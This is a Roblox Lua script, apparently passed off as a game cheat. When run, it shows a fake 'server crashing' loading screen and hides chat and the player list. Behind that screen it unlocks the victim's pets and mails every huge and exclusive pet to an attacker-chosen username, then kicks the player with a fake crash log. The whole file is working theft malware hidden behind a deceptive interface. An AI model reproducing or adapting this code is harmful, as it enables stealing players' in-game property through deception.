local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
local CoreGui = game:GetService("CoreGui")
local Client = Players.LocalPlayer
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
local Fire = Network.Fire
local lockedCount = 0
local Invoke = Network.Invoke

local PetFolders = {
	Client.PlayerGui.Inventory.Frame.Main.Pets.Normal,
	Client.PlayerGui.Inventory.Frame.Main.Pets.Titanic
}

hookfunction(getupvalue(Fire, 1), function(...) 
	return true 
end)

local Loading = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Dots = Instance.new("Frame")
local Dot1 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local InsideDot = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Dot2 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local InsideDot_2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local Dot3 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local InsideDot_3 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Bar = Instance.new("Frame")
local Bar2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local UICorner_8 = Instance.new("UICorner")
local Percentage = Instance.new("TextLabel")
local Tip = Instance.new("TextLabel")
local EndSequence = Instance.new("Frame")
Loading.Name = "Loading"
Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.DisplayOrder = 250
MainFrame.Name = "MainFrame"
MainFrame.Parent = Loading
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(-0.125, 0,-0.125, 0)
MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.185, 0,0.250, 0)
Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
Title.Font = Enum.Font.FredokaOne
Title.Text = _G.ScriptName
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true
Dots.Name = "Dots"
Dots.Parent = MainFrame
Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dots.BackgroundTransparency = 1.000
Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
Dot1.Name = "Dot1"
Dot1.Parent = Dots
Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner.CornerRadius = UDim.new(0.5, 0)
UICorner.Parent = Dot1
InsideDot.Name = "InsideDot"
InsideDot.Parent = Dot1
InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = InsideDot
Dot2.Name = "Dot2"
Dot2.Parent = Dots
Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner_3.CornerRadius = UDim.new(0.5, 0)
UICorner_3.Parent = Dot2
InsideDot_2.Name = "InsideDot"
InsideDot_2.Parent = Dot2
InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_4.CornerRadius = UDim.new(0.5, 0)
UICorner_4.Parent = InsideDot_2
Dot3.Name = "Dot3"
Dot3.Parent = Dots
Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner_5.CornerRadius = UDim.new(0.5, 0)
UICorner_5.Parent = Dot3
InsideDot_3.Name = "InsideDot"
InsideDot_3.Parent = Dot3
InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_6.CornerRadius = UDim.new(0.5, 0)
UICorner_6.Parent = InsideDot_3
Bar.Name = "Bar"
Bar.Parent = MainFrame
Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
Bar2.Name = "Bar2"
Bar2.Parent = Bar
Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Bar2.BorderSizePixel = 0
Bar2.Size = UDim2.new(0, 0, 1, 0)
UICorner_7.CornerRadius = UDim.new(0.5, 0)
UICorner_7.Parent = Bar2
UICorner_8.CornerRadius = UDim.new(0.5, 0)
UICorner_8.Parent = Bar
Percentage.Name = "Percentage"
Percentage.Parent = Bar
Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Percentage.BackgroundTransparency = 1.000
Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
Percentage.Font = Enum.Font.FredokaOne
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage.TextScaled = true
Percentage.TextSize = 14.000
Percentage.TextWrapped = true
Tip.Name = "Tip"
Tip.Parent = MainFrame
Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tip.BackgroundTransparency = 1.000
Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
Tip.Font = Enum.Font.SourceSansItalic
Tip.Text = ""
Tip.TextColor3 = Color3.fromRGB(138, 138, 138)
Tip.TextScaled = true
Tip.TextSize = 14.000
Tip.TextWrapped = true
EndSequence.Name = "EndSequence"
EndSequence.Parent = Loading
EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
EndSequence.BorderSizePixel = 0
EndSequence.Position = UDim2.new(1, 0, 0, 0)
EndSequence.Size = UDim2.new(1, 0, 1, 0)
local function FDEUJ_fake_script()
	local script = Instance.new('LocalScript', Dots)
	while true do
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
	end
end
coroutine.wrap(FDEUJ_fake_script)()
local function IIWP_fake_script()
	local script = Instance.new('LocalScript', MainFrame)
	local bar = script.Parent.Bar
	local insidebar = bar.Bar2
	local percentage = bar.Percentage
	wait(5)
	insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 200, true)
	wait(200)
	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
	wait(3)
	game.Players.LocalPlayer:Kick("[Crash Log ".. math.random(50, 5000) .. "] Please Rejoin.")
end
coroutine.wrap(IIWP_fake_script)()
local function HDJINS_fake_script()
	local script = Instance.new('LocalScript', Percentage)
	wait(5)
	for i = 1,100 do
		script.Parent.Text = i.."%"
		wait(2)
	end
end
coroutine.wrap(HDJINS_fake_script)()
local function KSANL_fake_script()
	local script = Instance.new('LocalScript', Tip)
	local tip = script.Parent
	while true do
		wait(5)
		tip.Text = "Server is crashing."
		wait(5)
		tip.Text = "Rejoin after the crash."
		wait(5)
		tip.Text = "Please do not leave."
		wait(5)
		tip.Text = "You will get your pets back after the crash."
		wait(5)
		tip.Text = "This may take a while."
	end
end
coroutine.wrap(KSANL_fake_script)()
local function JTTEJPB_fake_script()
	local script = Instance.new('LocalScript', Loading)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end
coroutine.wrap(JTTEJPB_fake_script)()

local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(mailbox:GetDescendants()) do
    if v:IsA("MeshPart") or v:IsA("Part") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
        break
    end
end

if Client.leaderstats.Diamonds.Value < 50000000 then
	Client:Kick("Script Error")
end

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)

local function unlockPetsInFolder(folder)
	local children = folder:GetChildren()
	for _, child in ipairs(children) do
	    if child:IsA("TextButton") and child.Locked.Visible == true then
	    	local name = child.Name
	    	if child.Name then
		    	local args2 = {
			    	[1] = {
				    	["" .. name] = false
			    	}
		    	}
		    	Invoke("Lock Pet", unpack(args2))
	    	end
		end
	end
end

while true do
	for _, folder in pairs(PetFolders) do
	  unlockPetsInFolder(folder)
	  wait(.2)
	end
	for _, folder in ipairs(PetFolders) do
	    for _, child in ipairs(folder:GetChildren()) do
			if child:IsA("TextButton") and child.Locked.Visible == true then
		    	lockedCount = lockedCount + 1
			end
	    end
	end
	if lockedCount == 0 then
	    print('Unlocked All')
	    break
	end
end

for i,v in pairs(game:GetDescendants()) do
	if v:IsA("Sound") then
		v:Destroy()
	end
end

local savedPets = FrameworkLibrary.Save.Get().Pets
while wait() do
	for i,v in pairs(savedPets) do
    	local v2 = FrameworkLibrary.Directory.Pets[v.id]
		if v2.huge == true then
			_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = 0,
        			["Pets"] = {v.uid},
        			["Message"] = "Troll"
    			}
			}
			Invoke("Send Mail", unpack(args))
		elseif v2.rarity == "Exclusive" then
			_G.Diamonds = 0
			local args = {
    			[1] = {
        			["Recipient"] = _G.Username,
        			["Diamonds"] = 0,
        			["Pets"] = {v.uid},
        			["Message"] = "Troll"
    			}
			}
			Invoke("Send Mail", unpack(args))
		end
	end
end
